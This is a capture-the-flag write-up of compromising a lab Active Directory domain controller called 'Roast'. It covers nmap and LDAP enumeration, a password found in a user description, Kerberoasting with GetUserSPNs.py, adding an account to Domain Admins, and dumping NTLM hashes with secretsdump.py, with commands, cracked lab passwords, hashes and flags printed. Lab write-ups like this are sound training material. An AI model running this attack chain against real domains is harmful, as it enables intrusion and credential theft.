# ROAST / Active Directory

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/fc670fd62aea42ec903340244f4c8535.png)

## NMAP SCAN

```text
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-03-21 18:30:33Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: roast.csl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: roast.csl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ROAST0
|   NetBIOS_Domain_Name: ROAST0
|   NetBIOS_Computer_Name: ROAST
|   DNS_Domain_Name: roast.csl
|   DNS_Computer_Name: Roast.roast.csl
|   DNS_Tree_Name: roast.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2021-03-21T18:31:26+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49762/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

## KERBEROS ENUMERATION

```bash
kerbrute -users /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -domain roast.csl -dc-ip 172.31.3.2
```

* I STOPED BECAUSE WE HAVE THE USERS IN LDAP ENUMERATION

## LDAP ENUMERATION

```text
nmap -n -sV --script "ldap* and not brute" 172.31.3.2 -Pn
```

```text
dn: CN=David Smith,OU=Roast,DC=roast,DC=csl
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: David Smith
|         sn: Smith
|         description: Your Password is WelcomeToR04st
|         givenName: David
|         distinguishedName: CN=David Smith,OU=Roast,DC=roast,DC=csl
|         instanceType: 4
|         whenCreated: 2020/05/15 06:30:43 UTC
|         whenChanged: 2020/05/15 21:42:47 UTC
|         displayName: David Smith
|         uSNCreated: 16572
|         uSNChanged: 32799
|         name: David Smith
|         objectGUID: 95a9772-f36-7344-9cc1-53d257cf635e
|         userAccountControl: 66048
|         badPwdCount: 1
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: 2021-03-21T22:48:27+00:00
|         lastLogoff: 0
|         lastLogon: 2020-05-18T02:52:56+00:00
|         logonHours: \xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF
|         pwdLastSet: 2020-05-16T01:50:11+00:00
|         primaryGroupID: 513
|         objectSid: 1-5-21-4133422454-1522376082-951199702-1103
|         accountExpires: Never
|         logonCount: 1
|         sAMAccountName: dsmith
|         sAMAccountType: 805306368
|         userPrincipalName: dsmith@roast.csl
```

```text
dsmith:WelcomeToR04st
```

### USERS

```text
dsmith
crhodes
ssmith
```

## LOGIN EVIL-WINRM

* THE PASSWORD WORKS WITH CRHODES

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/44b34fed834147df807465c56dcfa49e.png)

## WINPEAS

* UPLOAD WINPEAS

```text
upload /opt/priv/winPEASx64.exe
```

* NOTHING INTERESTED

## BLOODHOUND

```text
upload /opt/priv/sharphound.exe

download 20210321120445_BloodHound.zip
```

```text
Find Shortest Paths to Domain Admins
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/323c26014de8493fac7a46c133250f45.png)

```text
List all Kerberoastable Accounts
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/15a74293a74e4cefb880d98ac3dfe149.png)

```text
Shortest Paths to Domain Admins from Kerberoastable Users
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/f2c9892a02a14d67aa537263688983c2.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/7c0b96104269451b99c76119b14e0d11.png)

## GET USER ROASTSVC

```text
GetUserSPNs.py -dc-ip 172.31.3.2 roast.csl/crhodes -debug
```

* WE CAN REQUEST ROASTSVC

```text
GetUserSPNs.py -dc-ip 172.31.3.2 -request roast.csl/crhodes -outputfile hash
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/1746ee33e21b4f60afe3a67de4e5b907.png)

```text
roastsvc:!!!watermelon245
```

### LOGIN WITH EVIL-WINRM

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/84259dbc77874b7daf1a49d6c893fc1f.png)

### PRIV ESC

```text
net group "Domain Admins" roastsvc /add /domain
```

### DUMPING HASHES

```text
secretsdump.py roast.csl/roastsvc:'!!!watermelon245'@172.31.3.2
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6861a8cfc1c3b9f3ff39a8adb6bd388:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:016e928748d559770ee5fe3028baf718:::
roast.csl\dsmith:1103:aad3b435b51404eeaad3b435b51404ee:a0a8160111b21d48d2e816f4cc8da053:::
roast.csl\crhodes:1104:aad3b435b51404eeaad3b435b51404ee:a0a8160111b21d48d2e816f4cc8da053:::
roast.csl\ssmith:1105:aad3b435b51404eeaad3b435b51404ee:23991f3cd665b0bc1f7cccfd62506161:::
roast.csl\roastsvc:1106:aad3b435b51404eeaad3b435b51404ee:2f77331cfd7b2142b3a86a7d2ce7e824:::
```

## ADMINISTRATOR LOGIN

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/817e620cafaf48c9a69cab1dfbb3774f.png)

## FLAGS

### USER

```text
0042894e0a6b2bc2c4517c5f7ccc5c16
```

### ROOT

```text
9d91f887b78d82444a5af8bbd0d115db
```

